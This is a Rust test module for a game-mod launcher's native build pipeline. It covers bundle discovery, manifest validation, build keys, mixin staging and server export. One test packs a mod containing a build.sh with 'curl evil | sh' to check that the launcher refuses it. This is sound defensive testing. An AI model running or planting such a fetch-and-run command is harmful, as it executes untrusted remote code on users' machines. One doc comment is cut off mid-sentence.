        assert_eq!(arm64.machine, Some(rust_toolchain::WINDOWS_ARM64_MACHINE));
        assert_eq!(
            arm64.cache_key(),
            Some(rust_toolchain::WINDOWS_ARM64_TARGET)
        );

        assert!(windows_build_platform(
            rust_toolchain::WINDOWS_X64_MACHINE,
            rust_toolchain::WINDOWS_ARM64_TARGET,
        )
        .is_err());
        assert!(windows_build_platform(
            rust_toolchain::WINDOWS_ARM64_MACHINE,
            rust_toolchain::WINDOWS_X64_TARGET,
        )
        .is_err());
        assert!(windows_build_platform(0xa641, rust_toolchain::WINDOWS_ARM64_TARGET).is_err());
    }

    #[test]
    fn client_runtime_reuses_base_resources_but_server_exports_remain_standalone() {
        let source = dir("resource-base");
        let client = dir("resource-client");
        let server = dir("resource-server");
        fs::create_dir_all(source.join(".local/horizon-client/26.3")).unwrap();
        fs::write(source.join(".local/horizon-client/26.3/data"), b"prepared").unwrap();
        fs::write(source.join("horizon-ctl"), b"control").unwrap();
        copy_base(&source, &client, Target::Client, true).unwrap();
        copy_base(&source, &server, Target::Server, false).unwrap();
        assert!(!client.join(".local").exists());
        assert_eq!(fs::read(client.join("horizon-ctl")).unwrap(), b"control");
        assert_eq!(
            fs::read(server.join(".local/horizon-client/26.3/data")).unwrap(),
            b"prepared"
        );
        for path in [source, client, server] {
            fs::remove_dir_all(path).unwrap();
        }
    }

    #[test]
    fn a_rebuild_excludes_the_engine_and_unsupported_build_artifacts() {
        use std::ffi::OsStr;
        for own in [
            backend::CLIENT,
            ".installed",
            "native-mods.json",
            "native-data",
        ] {
            assert!(!carried_over(OsStr::new(own), Target::Client), "{own}");
        }
        for kept in ["horizon-ctl", "resources", "LICENSE"] {
            assert!(carried_over(OsStr::new(kept), Target::Client), "{kept}");
        }
        // A server build keeps neither the game's own binary nor a stale `horizon-engine` the
        // base shipped, which would run unmodded beside the built one.
        let engine = Target::Server.binary();
        assert!(
            !carried_over(OsStr::new(&engine), Target::Server),
            "{engine}"
        );
        assert!(!carried_over(OsStr::new(backend::CLIENT), Target::Server));
        assert!(carried_over(OsStr::new("resources"), Target::Server));
    }

    pub(super) fn dir(name: &str) -> PathBuf {
        let d = std::env::temp_dir().join(format!("horizon-native-{name}-{}", std::process::id()));
        let _ = fs::remove_dir_all(&d);
        fs::create_dir_all(&d).unwrap();
        d
    }

    /// The launcher's toolchain in `dir` for every host it ships one for: the build commands are
    /// checked for each host on whichever machine runs the tests, not only for its own.
    fn toolchains(dir: impl Into<PathBuf>) -> Vec<Toolchain> {
        let dir = dir.into();
        rust_toolchain::hosts()
            .iter()
            .map(|host| Toolchain {
                dir: dir.clone(),
                host,
            })
            .collect()
    }

    /// What `rust`'s host puts before cargo's subcommand ([`Toolchain::configure_cargo`]): the
    /// ARM64 target's rustflags, nothing on the other hosts.
    fn host_args(rust: &Toolchain) -> Vec<String> {
        let mut cmd = Command::new("cargo");
        rust.configure_cargo(&mut cmd);
        cmd.get_args()
            .map(|a| a.to_string_lossy().into_owned())
            .collect()
    }

    /// `cmd`'s arguments after its host's own ([`host_args`]), which must come first.
    fn args_after_host(rust: &Toolchain, cmd: &Command) -> Vec<String> {
        let args: Vec<String> = cmd
            .get_args()
            .map(|a| a.to_string_lossy().into_owned())
            .collect();
        let host = host_args(rust);
        assert_eq!(args[..host.len()], host, "{}", rust.host.target);
        args[host.len()..].to_vec()
    }

    fn project_manifest(id: &str, version: &str, horizon: &str, mixins: &str) -> String {
        format!(
            "id='{id}'\nname='{id}'\nversion='{version}'\napi='0.2'\ncapabilities=['registries']\n[native]\ngame='26.3'\nhorizon='{horizon}'\nmixins='{mixins}'\n"
        )
    }

    pub(super) fn write_bundle(project: &Path, id: &str, helper: &str) {
        fs::create_dir_all(project.join("src")).unwrap();
        fs::write(
            project.join(NATIVE_MANIFEST),
            project_manifest(id, "0.1.0", A, B),
        )
        .unwrap();
        fs::write(
            project.join("Cargo.toml"),
            "[package]\nname='example'\nversion='9.0.0'\n[dependencies]\nhorizon-client='0.1'\n",
        )
        .unwrap();
        fs::write(project.join("src/lib.rs"), helper).unwrap();
    }

    #[test]
    fn mixins_input_materializes_modules_without_changing_the_download() {
        let root = dir("mixins-area-input");
        let source = root.join("download");
        let prepared = root.join("prepared");
        let src = source.join("crates/horizon-client/src");
        let area = src.join("game/items");
        let hooks = src.join("game/native_hooks");
        fs::create_dir_all(&area).unwrap();
        fs::create_dir_all(&hooks).unwrap();
        let game = "struct Game; mod native_hooks;\ninclude!(concat!(env!(\"OUT_DIR\"), \"/game_modules.rs\"));\n";
        let native = "include!(concat!(env!(\"OUT_DIR\"), \"/native_hook_modules.rs\"));\n";
        let helper = "use super::*; impl Game { fn area_helper(&mut self) {} }";
        fs::write(src.join("game.rs"), game).unwrap();
        fs::write(area.join(".game-area"), "").unwrap();
        fs::write(area.join("using_item.rs"), helper).unwrap();
        fs::write(hooks.join("mod.rs"), native).unwrap();
        fs::write(
            hooks.join("base.rs"),
            "use super::super::*; impl Game { fn native_helper(&mut self) {} }",
        )
        .unwrap();
        prepare_mixins_source(&source, &prepared).unwrap();
        // External tools parse ordinary mod declarations, without our expansion pass.
        fn modules(path: &Path) -> Vec<String> {
            syn::parse_file(&fs::read_to_string(path).unwrap())
                .unwrap()
                .items
                .into_iter()
                .filter_map(|item| match item {
                    syn::Item::Mod(module) => Some(module.ident.to_string()),
                    _ => None,
                })
                .collect()
        }
        let output = prepared.join("crates/horizon-client/src");
        assert!(modules(&output.join("game.rs")).contains(&"using_item".into()));
        assert_eq!(modules(&output.join("game/native_hooks/mod.rs")), ["base"]);
        assert_eq!(
            fs::read_to_string(output.join("game/items/using_item.rs")).unwrap(),
            helper
        );
        assert_eq!(fs::read_to_string(src.join("game.rs")).unwrap(), game);
        assert_eq!(fs::read_to_string(hooks.join("mod.rs")).unwrap(), native);
        let first = fs::read(output.join("game.rs")).unwrap();
        // A failed older preparation may have left an area that the next source no longer has.
        let stale_area = output.join("game/removed");
        fs::create_dir_all(&stale_area).unwrap();
        fs::write(stale_area.join(".game-area"), "").unwrap();
        fs::write(stale_area.join("old.rs"), "fn old() {}").unwrap();
        prepare_mixins_source(&source, &prepared).unwrap();
        assert!(!stale_area.exists());
        assert_eq!(fs::read(output.join("game.rs")).unwrap(), first);
        let invalid = src.join("game/unmarked");
        fs::create_dir_all(&invalid).unwrap();
        fs::write(invalid.join("misplaced.rs"), "fn misplaced() {}").unwrap();
        let error = prepare_mixins_source(&source, &prepared).unwrap_err();
        assert!(error.contains("missing .game-area marker"), "{error}");
        assert!(!prepared.exists());
        assert!(invalid.exists());
        fs::remove_dir_all(root).unwrap();
    }

    #[test]
    fn horizon_mixins_finds_the_launchers_cargo() {
        for rust in toolchains("/rust/1.99.1-x") {
            horizon_mixins_finds(&rust);
        }
    }

    fn horizon_mixins_finds(rust: &Toolchain) {
        let cmd = apply(
            rust,
            Path::new("/tools/horizon-mixins"),
            Path::new("/src"),
            Path::new("/mods"),
            Path::new("/out"),
        );
        let path = cmd
            .get_envs()
            .find(|(k, _)| *k == "PATH")
            .and_then(|(_, v)| v)
            .unwrap();
        assert_eq!(
            std::env::split_paths(path).next(),
            Some(rust.dir.join("bin"))
        );
        assert_eq!(
            cmd.get_args().collect::<Vec<_>>(),
            [
                "apply",
                "--workspace",
                "/src",
                "--mods",
                "/mods",
                "--out",
                "/out"
            ]
        );
    }

    #[test]
    fn retired_native_fields_are_refused_before_bundle_projection() {
        let root = dir("retired-native-fields");
        write_bundle(&root, "alpha", "");
        for field in ["injection", "internals"] {
            fs::write(
                root.join(NATIVE_MANIFEST),
                project_manifest("alpha", "1", A, B) + &format!("[[native.{field}]]\n"),
            )
            .unwrap();
            let error = bundles(&root).unwrap_err();
            assert!(error.contains("unknown field"), "{error}");
            assert!(error.contains(field), "{error}");
        }
        fs::remove_dir_all(root).unwrap();
    }

    #[test]
    fn a_folder_is_one_bundle_or_a_folder_of_them() {
        let one = dir("one");
        write_bundle(&one, "hello", "fn hook() {}");
        let found = bundles(&one).unwrap();
        assert_eq!(
            (
                found[0].manifest.id.as_str(),
                found[0].manifest.version.as_str()
            ),
            ("hello", "0.1.0")
        );
        let many = dir("many");
        write_bundle(&many.join("b"), "beta", "fn hook() {}");
        write_bundle(&many.join("a"), "alpha", "fn hook() {}");
        fs::create_dir_all(many.join("notes")).unwrap();
        let ids: Vec<String> = bundles(&many)
            .unwrap()
            .into_iter()
            .map(|b| b.manifest.id)
            .collect();
        assert_eq!(ids, ["alpha", "beta"]);
        assert!(bundles(&many.join("notes")).is_err());
    }

    #[test]
    fn generated_tool_input_is_separate_from_pack_resources() {
        let root = dir("mixed-mixin-input");
        let incoming = root.join("incoming");
        for (id, injection) in [
            ("plain", ""),
            (
                "ordinary",
                "[[native.module]]\nid='ordinary'\nfile='crates/horizon-client/src/game.rs'\nname='ordinary'\nsource='src/lib.rs'\n",
            ),
            (
                "slot_injection",
                "[[inject]]\nid='hook'\nat='horizon_client::game::tick'\nkind='head'\nwith='hook'\nhash='signature'\n",
            ),
        ] {
            let project = incoming.join(id);
            write_bundle(&project, id, "fn hook() {}");
            fs::write(
                project.join(NATIVE_MANIFEST),
                project_manifest(id, "1", A, B) + injection,
            )
            .unwrap();
            for tree in ["assets", "data"] {
                fs::create_dir_all(project.join(tree).join(id)).unwrap();
                fs::write(project.join(tree).join(id).join("table.txt"), id).unwrap();
            }
        }
        let mods = bundles(&incoming).unwrap();
        // A unified slot declaration is the launcher's: it never reaches horizon-mixins.
        assert!(mods[0].needs_mixins());
        assert!(!mods[1].needs_mixins() && !mods[2].needs_mixins());
        let input = root.join("mixins");
        stage_mixins(&mods, &input).unwrap();
        assert!(!input.join("plain").exists() && !input.join("slot_injection").exists());
        assert!(input.join("ordinary").join(MANIFEST).is_file());
        assert!(mods
            .iter()
            .all(|bundle| !bundle.dir.join(MANIFEST).exists()));
        for bundle in &mods {
            let id = &bundle.manifest.id;
            let copied = root.join("packages").join(id);
            copy_bundle(bundle, &copied).unwrap();
            for tree in ["assets", "data"] {
                let resource = Path::new(tree).join(id).join("table.txt");
                assert_eq!(fs::read_to_string(bundle.dir.join(&resource)).unwrap(), *id);
                assert_eq!(fs::read_to_string(copied.join(resource)).unwrap(), *id);
                assert!(!input.join(id).join(tree).exists());
            }
        }
        fs::remove_dir_all(root).unwrap();
    }

    const A: &str = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
    const B: &str = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";

    fn write_native(at: &Path, id: &str, horizon: &str, mixins: &str) {
        write_bundle(at, id, "pub fn marker() {}\n");
        fs::write(
            at.join(NATIVE_MANIFEST),
            project_manifest(id, "0.3.0", horizon, mixins),
        )
        .unwrap();
    }

    #[test]
    fn native_mods_for_another_game_revision_are_rejected() {
        let root = dir("revision-mismatch");
        write_native(&root.join("matching"), "matching", A, B);
        write_native(&root.join("other"), "other", B, B);
        let mods = bundles(&root).unwrap();
        assert_eq!(
            mismatch(&mods, A).as_deref(),
            Some("other → bbbbbbb; the build uses aaaaaaa")
        );
        assert!(mismatch(&mods[..1], A).is_none());
        fs::remove_dir_all(root).unwrap();
    }

    #[test]
    fn a_registry_download_is_a_bundle_with_its_pins() {
        let d = dir("hmod");
        write_native(&d.join("veinminer"), "veinminer", A, B);
        write_bundle(&d.join("local"), "hello", "fn hook() {}");
        let found = bundles(&d).unwrap();
        assert_eq!(found.len(), 2);
        assert_eq!(found[1].manifest.id, "veinminer");
        assert_eq!(found[1].dir, d.join("veinminer"));
        assert_eq!(found[1].native().horizon, A);
        assert_eq!(found[1].native().mixins, B);
        assert_eq!(found[0].native().horizon, A);
    }

    #[test]
    fn flat_projects_use_manifest_identity_and_reject_old_roots() {
        let root = dir("project-layout");
        write_native(&root, "example", A, B);
        assert_eq!(bundle_in(&root).unwrap().unwrap().manifest.id, "example");
        // Cargo's different name/version do not change mod identity.
        assert_eq!(bundle_in(&root).unwrap().unwrap().manifest.version, "0.3.0");
        fs::write(
            root.join(NATIVE_MANIFEST),
            project_manifest("../escape", "1", A, B),
        )
        .unwrap();
        assert!(bundle_in(&root).is_err());
        fs::write(
            root.join(NATIVE_MANIFEST),
            project_manifest("example", "1", A, B),
        )
        .unwrap();
        for old in [
            "horizon-native.json",
            "horizon-mixin.toml",
            "native",
            "rust",
        ] {
            fs::write(root.join(old), "").unwrap();
            assert!(bundle_in(&root).is_err(), "{old}");
            fs::remove_file(root.join(old)).unwrap();
        }
        fs::remove_dir_all(root).unwrap();
    }

    #[test]
    fn installed_mods_are_the_checked_files_of_those_turned_on() {
        let d = dir("installed-src");
        write_native(&d, "veinminer", A, B);
        let home = dir("installed-home");
        fs::create_dir_all(home.join(INSTALLED)).unwrap();
        let pack = |name: &str, extra: Option<(&str, &str)>| {
            let mut zip =
                zip::ZipWriter::new(fs::File::create(home.join(INSTALLED).join(name)).unwrap());
            let options = zip::write::SimpleFileOptions::default();
            for file in [NATIVE_MANIFEST, "Cargo.toml", "src/lib.rs"] {
                zip.start_file(file, options).unwrap();
                zip.write_all(&fs::read(d.join(file)).unwrap()).unwrap();
            }
            if let Some((file, body)) = extra {
                zip.start_file(file, options).unwrap();
                zip.write_all(body.as_bytes()).unwrap();
            }
            zip.finish().unwrap();
        };
        pack("veinminer.hmod", None);
        assert!(installed_mods(&home).is_err(), "off until turned on");
        crate::browser::java::set_enabled(&home, "veinminer", true).unwrap();
        let out = installed_mods(&home).unwrap();
        let found = bundles(&out).unwrap();
        assert_eq!(
            fs::read(found[0].dir.join("src/lib.rs")).unwrap(),
            b"pub fn marker() {}\n"
        );
        let injected = d.join("injected-project");
        write_native(&injected, "injected", A, B);
        fs::write(
            injected.join(NATIVE_MANIFEST),
            project_manifest("injected", "0.3.0", A, B)
                + "[[native.module]]\nid='marker'\nfile='crates/horizon-client/src/game.rs'\nname='marker'\nsource='src/lib.rs'\n",
        )
        .unwrap();
        let mut mods = found.clone();
        mods.push(bundle_in(&injected).unwrap().unwrap());
        let staged = d.join("tool-input");
        let tool_mods = stage_mixins(&mods, &staged).unwrap();
        assert_eq!(tool_mods.len(), 1);
        assert_eq!(tool_mods[0].manifest.id, "injected");
        assert!(!staged.join("veinminer").exists());
        assert!(staged.join("injected/horizon-mixin.toml").is_file());
        assert_eq!(
            fs::read(staged.join("injected/src/lib.rs")).unwrap(),
            b"pub fn marker() {}\n"
        );
        assert!(!staged.join("injected/native").exists());
        assert_eq!(
            (
                found[0].manifest.id.as_str(),
                found[0].native().horizon.as_str()
            ),
            ("veinminer", A)
        );
        // What a build records of it is what the Mods page compares: up to date, not Needs rebuild.
        assert_eq!(
            crate::native_status::enabled(&home),
            [(
                "veinminer".to_string(),
                "0.3.0".to_string(),
                source_digest(&found[0])
            )]
        );
        pack("veinminer.hmod", Some(("data/veinminer/table.bin", "data")));
        let out = installed_mods(&home).unwrap();
        let path = out.join("veinminer/data/veinminer/table.bin");
        assert_eq!(fs::read(&path).unwrap(), b"data");
        let first = version_for(
            A,
            B,
            Profile::Balanced,
            Target::Client,
            None,
            &bundles(&out).unwrap(),
        )
        .unwrap();
        fs::write(path, b"changed").unwrap();
        assert_ne!(
            first,
            version_for(
                A,
                B,
                Profile::Balanced,
                Target::Client,
                None,
                &bundles(&out).unwrap()
            )
            .unwrap()
        );
        pack("veinminer.hmod", Some(("build.sh", "curl evil | sh")));
        assert!(installed_mods(&home).is_err(), "only Rust and TOML sources");
    }

    /// A player's report (11-04): Right-Click Crops 1.0.0 pins Nightly 2026-10-31's commit, so
    /// The commit-date cache (`dates.json`) is asked once per revision and kept for later
    /// builds.
    #[test]
    fn a_commit_date_is_asked_once_and_kept() {
        let d = dir("commit-dates");
        let file = d.join(DATES);
        let ask = |_: &str, r: &str| -> Result<String, String> { Ok(format!("date of {r}")) };
        assert_eq!(
            remembered(&file, "acme/x", A, ask).unwrap(),
            format!("date of {A}")
        );
        let offline = |_: &str, _: &str| -> Result<String, String> { Err("offline".into()) };
        assert_eq!(
            remembered(&file, "acme/x", A, offline).unwrap(),
            format!("date of {A}")
        );
        // Another repo or revision isn't known yet.
        assert!(remembered(&file, "acme/y", A, offline).is_err());
        assert!(remembered(&file, "acme/x", B, offline).is_err());
        // A broken file is asked again and rewritten.
        fs::write(&file, "not json").unwrap();
        assert_eq!(
            remembered(&file, "acme/x", B, ask).unwrap(),
            format!("date of {B}")
        );
        assert_eq!(
            remembered(&file, "acme/x", B, offline).unwrap(),
            format!("date of {B}")
        );
    }

    #[test]
    fn unknown_manifest_fields_are_refused_by_the_typed_reader() {
        let d = dir("unknown-field");
        write_native(&d, "zoom", A, B);
        let text = fs::read_to_string(d.join(NATIVE_MANIFEST)).unwrap();
        for (name, value) in [("hooks", "1"), ("banana", "\"x\"")] {
            fs::write(
                d.join(NATIVE_MANIFEST),
                format!("{text}\n{name} = {value}\n"),
            )
            .unwrap();
            let error = bundles(&d).unwrap_err();
            assert!(error.contains("unknown field"), "{error}");
            assert!(error.contains(name), "{error}");
        }
    }

    #[test]
    fn the_version_changes_with_the_revision_and_any_file_of_the_mods() {
        let d = dir("key");
        write_bundle(&d, "hello", "fn hook() {}");
        let key = |revision: &str| {
            version_for(
                revision,
                MIXINS_REV,
                Profile::Balanced,
                Target::Client,
                None,
                &bundles(&d).unwrap(),
            )
            .unwrap()
        };
        let first = key(A);
        assert!(
            first.starts_with("native-aaaaaaa-") && first.len() == "native-aaaaaaa-".len() + 12
        );
        assert!(is_native(&first) && !backend::is_game_tag(&first));
        assert_eq!(first, key(A));
        assert_ne!(
            first,
            version_for(
                A,
                MIXINS_REV,
                Profile::Balanced,
                Target::Client,
                Some(rust_toolchain::WINDOWS_ARM64_TARGET),
                &bundles(&d).unwrap(),
            )
            .unwrap(),
            "the ARM64 toolchain has a separate installed build"
        );
        let path = d.join("horizon-mod.toml");
        let original = fs::read_to_string(&path).unwrap();
        let declaration = "\n[[inject]]\nid='listener'\nat='horizon_client::game::Game::tick'\nkind='head'\naccess='internals'\nwith='hook'\nhash='0000000000000000'\n";
        fs::write(&path, format!("{original}{declaration}")).unwrap();
        let declared = key(A);
        assert_ne!(first, declared, "a declaration is part of the build");
        assert_eq!(declared, key(A), "an unchanged manifest reuses the build");
        fs::write(
            &path,
            format!(
                "{original}{}",
                declaration.replace("id='listener'", "id='changed'")
            ),
        )
        .unwrap();
        assert_ne!(declared, key(A), "an inject's id is part of the key");
        fs::write(path, original).unwrap();
        assert_ne!(first, key(B));
        assert_ne!(
            first,
            version_for(
                A,
                B,
                Profile::Balanced,
                Target::Client,
                None,
                &bundles(&d).unwrap()
            )
            .unwrap()
        );
        fs::write(d.join("src/lib.rs"), "fn hook() { let _ = 1; }").unwrap();
        assert_ne!(first, key(A));
    }

    #[test]
    fn build_output_is_neither_copied_nor_hashed() {
        let d = dir("api-target");
        write_bundle(&d, "example", "");
        fs::create_dir_all(d.join("target/debug")).unwrap();
        fs::create_dir_all(d.join(".git/hooks")).unwrap();
        fs::write(d.join("target/debug/output"), "one").unwrap();
        fs::write(d.join(".git/hooks/pre-commit"), "not packaged").unwrap();
        let bundle = bundle_in(&d).unwrap().unwrap();
        let key = || {
            version_for(
                A,
                B,
                Profile::Balanced,
                Target::Client,
                None,
                std::slice::from_ref(&bundle),
            )
            .unwrap()
        };
        let first = key();
        let hash = mod_hash(&bundle).unwrap();
        let digest = source_digest(&bundle);
        fs::write(d.join("target/debug/output"), "two").unwrap();
        assert_eq!(first, key());
        assert_eq!(hash, mod_hash(&bundle).unwrap());
        assert_eq!(digest, source_digest(&bundle));
        let dest = dir("api-target-copy");
        copy_bundle(&bundle, &dest).unwrap();
        assert!(!dest.join("target").exists());
        assert!(!dest.join(".git").exists());
        assert!(dest.join("src/lib.rs").is_file());
        fs::write(d.join("Cargo.toml"), "changed").unwrap();
        assert_ne!(first, key());
    }

    #[test]
    fn the_key_covers_a_bundles_crate_and_data_files() {
        let d = dir("crate-key");
        write_bundle(&d, "crate_demo", "fn hook() {}\n");
        fs::write(d.join("src/salt.rs"), "pub const SALT: u32 = 42;\n").unwrap();
        fs::create_dir_all(d.join("data/crate_demo")).unwrap();
        fs::write(d.join("data/crate_demo/greeting.txt"), "hello").unwrap();
        fs::write(d.join("Cargo.lock"), format!("version=4\n[[package]]\nname='itoa'\nversion='0.4.8'\nsource='registry+https://github.com/rust-lang/crates.io-index'\nchecksum='{}'\n", "a".repeat(64))).unwrap();
        let key = || {
            version_for(
                A,
                B,
                Profile::Balanced,
                Target::Client,
                None,
                &bundles(&d).unwrap(),
            )
            .unwrap()
        };
        let mut seen = vec![key()];
        // This package's pre-source-only build must not be reused with its staged data.
        assert_ne!(seen[0], "native-aaaaaaa-2596136aef15");
        for file in [
            "src/lib.rs",
            "src/salt.rs",
            "Cargo.toml",
            "Cargo.lock",
            "data/crate_demo/greeting.txt",
        ] {
            let mut bytes = fs::read(d.join(file)).unwrap();
            if file == "Cargo.lock" {
                bytes = String::from_utf8(bytes)
                    .unwrap()
                    .replace(&"a".repeat(64), &"b".repeat(64))
                    .into_bytes();
            } else {
                bytes.extend_from_slice(b"\n");
            }
            fs::write(d.join(file), bytes).unwrap();
            let now = key();
            assert!(!seen.contains(&now), "{file} is in the key");
            seen.push(now);
        }
    }

    #[test]
    fn each_profile_has_its_own_key_and_balanced_shares_its_folder_with_developer() {
        let d = dir("profile-key");
        write_bundle(&d, "hello", "fn hook() {}");
        let found = bundles(&d).unwrap();
        let keys: std::collections::BTreeSet<_> = (Profile::ALL.into_iter())
            .map(|p| version_for(A, B, p, Target::Client, None, &found).unwrap())
            .collect();
        assert_eq!(keys.len(), 3);
        // The last build in `native/target/fast/` is either's, as `fast`'s was before `dev`.
        assert_eq!(record_key(Target::Client, Profile::Balanced, None), "fast");
        assert_eq!(record_key(Target::Client, Profile::Developer, None), "fast");
        assert_eq!(
            record_key(Target::Server, Profile::Optimized, None),
            "server-release"
        );
        assert_eq!(
            record_key(
                Target::Client,
                Profile::Balanced,
                Some(rust_toolchain::WINDOWS_ARM64_TARGET)
            ),
            "aarch64-pc-windows-gnullvm-fast"
        );
    }

    #[test]
    fn cached_mixin_output_isolated_from_next_build() {
        let d = dir("injection-cache-stage");
        let fresh = d.join("fresh");
        let snapshot = d.join("snapshot");
        let stage = d.join("stage");
        let patched = Path::new("crates/horizon-client/src/game.rs");
        fs::create_dir_all(fresh.join(patched).parent().unwrap()).unwrap();
        fs::write(fresh.join(patched), "patched by mixins").unwrap();
        sync(&fresh, &snapshot).unwrap();
        sync(&snapshot, &stage).unwrap();
        assert_eq!(
            fs::read_to_string(stage.join(patched)).unwrap(),
            "patched by mixins"
        );

        // A later no-mixin build stages the clean source and removes stale cached files.
        let source = d.join("source");
        fs::create_dir_all(source.join(patched).parent().unwrap()).unwrap();
        fs::write(source.join(patched), "clean source").unwrap();
        fs::write(stage.join("stale.rs"), "stale").unwrap();
        sync(&source, &stage).unwrap();
        assert_eq!(
            fs::read_to_string(stage.join(patched)).unwrap(),
            "clean source"
        );
        assert!(!stage.join("stale.rs").exists());
        fs::remove_dir_all(d).unwrap();
    }

    /// The server build (docs/server.md): compiled headless off the same source, with its own
    /// key, and the game build's flags unchanged.
    #[test]
    fn a_server_build_compiles_headless_with_its_own_key() {
        let d = dir("server-key");
        write_bundle(&d, "hello", "fn hook() {}");
        let found = bundles(&d).unwrap();
        let key =
            |target: Target| version_for(A, B, Profile::Balanced, target, None, &found).unwrap();
        assert_ne!(
            key(Target::Client),
            key(Target::Server),
            "the two targets never stand in for each other"
        );
        assert_eq!(key(Target::Server), key(Target::Server));
        assert_ne!(
            key(Target::Server),
            version_for(A, B, Profile::Optimized, Target::Server, None, &found).unwrap(),
            "the profile is still in the server key"
        );
        let rusts = toolchains("/rust/1.99.1-x");
        // The same after each host's own arguments.
        let flags = |stage: &Path, target: Target| {
            let each: Vec<Vec<String>> = rusts
                .iter()
                .map(|rust| {
                    let cmd = compile(
                        rust,
                        stage,
                        target,
                        Path::new("/native/target"),
                        Profile::Balanced,
                        "horizon-client",
                    );
                    args_after_host(rust, &cmd)
                })
                .collect();
            assert!(each.windows(2).all(|w| w[0] == w[1]), "{each:?}");
            each[0].clone()
        };
        let server = flags(&d, Target::Server);
        assert!(server.contains(&"--no-default-features".into()));
        assert!(
            !server.iter().any(|a| a.starts_with("--features")),
            "no feature the source doesn't have"
        );
        let client = flags(&d, Target::Client);
        assert!(!client.contains(&"--no-default-features".into()));
    }

    #[test]
    fn a_native_build_without_a_record_is_refused_before_preparation() {
        let Err(error) = pipeline(
            "native-missing-record-test",
            Path::new("missing-mod-folder"),
            Profile::Developer,
            Target::Client,
            BuildOptions::default(),
            &|_| panic!("invalid records must not start a build"),
        )
        .map_err(String::from) else {
            panic!("invalid build must be refused");
        };
        assert!(error.contains("native-mods.json record"), "{error}");
        assert!(error.contains("Rebuild it"), "{error}");
    }

    /// A record (`native-mods.json`) must name its target ([`about`]).
    #[test]
    fn a_builds_record_requires_a_valid_target() {
        let d = dir("about-target");
        let record = |target: Option<&str>| {
            let json = match target {
                Some(target) => {
                    format!(r#"{{"base":"v2026.10.13","horizon":"{A}","target":"{target}"}}"#)
                }
                None => format!(r#"{{"base":"v2026.10.13","horizon":"{A}"}}"#),
            };
            fs::write(d.join("native-mods.json"), json).unwrap();
            about_in(&d)
        };
        assert_eq!(record(None), None);
        assert_eq!(record(Some("client")).unwrap().target, Target::Client);
        assert_eq!(record(Some("server")).unwrap().target, Target::Server);
        assert_eq!(record(Some("anything-else")), None);
        assert_eq!(record(Some("client")).unwrap().horizon, A);
    }

    /// The export ([`build_server`]): a standalone runtime folder with the engine, resources
    /// and the build's record, engine still executable, and nothing of the player's
    /// overwritten.
    #[test]
    fn an_exported_server_folder_keeps_its_files_and_overwrites_nothing() {
        let built = dir("export-built");
        fs::write(built.join(Target::Server.binary()), b"engine").unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            fs::set_permissions(
                built.join(Target::Server.binary()),
                std::fs::Permissions::from_mode(0o755),
            )
            .unwrap();
        }
        fs::create_dir_all(built.join("resources/data/bake")).unwrap();
        fs::write(built.join("resources/data/bake/table.json"), b"{}").unwrap();
        fs::create_dir_all(built.join("resources")).unwrap();
        fs::write(built.join("resources/lang.json"), b"{}").unwrap();
        let out = dir("export-out");
        let output = out.join("server");
        export(&built, &output).unwrap();
        assert_eq!(
            fs::read(output.join(Target::Server.binary())).unwrap(),
            b"engine"
        );
        assert_eq!(
            fs::read(output.join("resources/data/bake/table.json")).unwrap(),
            b"{}"
        );
        assert_eq!(fs::read(output.join("resources/lang.json")).unwrap(), b"{}");
        assert_eq!(
            fs::read_dir(&out).unwrap().flatten().count(),
            1,
            "no staging folder left beside it"
        );
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mode = fs::metadata(output.join(Target::Server.binary()))
                .unwrap()
                .permissions()
                .mode();
            assert_eq!(mode & 0o111, 0o111, "the engine stays executable");
        }
        // A folder already there is refused, and its contents are left alone.
        let taken = dir("export-taken");
        fs::write(taken.join("keep.txt"), b"mine").unwrap();
        let err = export(&built, &taken).unwrap_err();
        assert!(err.contains("already exists"), "{err}");
        assert_eq!(fs::read(taken.join("keep.txt")).unwrap(), b"mine");
        let failed = out.join("failed");
        assert!(export(&out.join("missing-source"), &failed).is_err());
        assert!(!failed.exists());
        assert_eq!(fs::read_dir(&out).unwrap().flatten().count(), 1);
    }

    #[test]
    fn server_install_is_not_playable_and_export_survives_cache_removal() {
        let base = "native-test-server-base";
        let version = "native-test-server-cache";
        let source = backend::version_dir(base);
        fs::create_dir_all(source.join(".local/horizon-client/26.3")).unwrap();
        fs::write(
            source.join(".local/horizon-client/26.3/facts.json"),
            b"facts",
        )
        .unwrap();
        fs::write(source.join(Target::Server.binary()), b"unmodded").unwrap();
        let native_dir = horizon_mod_package::mod_list::NATIVE_DIR;
        fs::create_dir_all(source.join(native_dir).join("stale")).unwrap();
        let project = dir("server-runtime-project");
        write_bundle(&project, "exported", "pub fn hook() {}");
        for (path, bytes) in [
            ("assets/exported/probe.txt", "asset"),
            ("data/exported/native/probe.json", "{}"),
            ("jars/cache.jar", "not a project file"),
        ] {
            let path = project.join(path);
            fs::create_dir_all(path.parent().unwrap()).unwrap();
            fs::write(path, bytes).unwrap();
        }
        let bundle = bundle_in(&project).unwrap().unwrap();
        let binary = dir("server-install").join("built");
        fs::write(&binary, b"modded").unwrap();
        install(
            base,
            version,
            Target::Server,
            &binary,
            &[],
            &serde_json::json!({"target":"server"}),
            &[bundle],
        )
        .unwrap();
        assert!(!backend::installed().contains(&version.to_string()));
        let cached = Target::Server.directory(version);
        let output = dir("server-independent").join("export");
        export(&cached, &output).unwrap();
        fs::remove_dir_all(cached).unwrap();
        assert_eq!(
            fs::read(output.join(Target::Server.binary())).unwrap(),
            b"modded"
        );
        assert_eq!(
            fs::read(output.join(".local/horizon-client/26.3/facts.json")).unwrap(),
            b"facts"
        );
        assert!(output.join("native-mods.json").is_file());
        fs::remove_dir_all(project).unwrap();
        let package = output.join(native_dir).join("exported");
        assert_eq!(
            fs::read(package.join("assets/exported/probe.txt")).unwrap(),
            b"asset"
        );
        assert_eq!(
            fs::read(package.join("data/exported/native/probe.json")).unwrap(),
            b"{}"
        );
        assert!(!package.join("jars").exists());
        assert!(!output.join(native_dir).join("stale").exists());
        let runtime = horizon_mod_package::runtime::Runtime::load(
            &output.join(Target::Server.binary()),
            &[horizon_mod_package::runtime::BuiltMod {
                id: "exported",
                version: "0.1.0",
                side: horizon_mod_package::Side::Client,
            }],
        )
        .unwrap();
        assert_eq!(runtime.packages()[0].path, package);
        let _ = fs::remove_dir_all(source);
    }

